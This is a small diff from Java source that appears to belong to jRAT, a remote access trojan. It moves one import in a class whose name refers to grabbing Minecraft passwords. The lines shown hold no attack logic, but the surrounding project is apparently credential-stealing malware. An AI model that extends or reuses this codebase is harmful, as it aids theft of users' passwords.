@@ -12,10 +12,10 @@ import javax.crypto.SecretKeyFactory;
 import javax.crypto.spec.PBEKeySpec;
 import javax.crypto.spec.PBEParameterSpec;
 
+import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet36MinecraftPassword;
 
-import com.redpois0n.common.OperatingSystem;
 
 
 public class Packet50MinecraftPassword extends AbstractIncomingPacket {
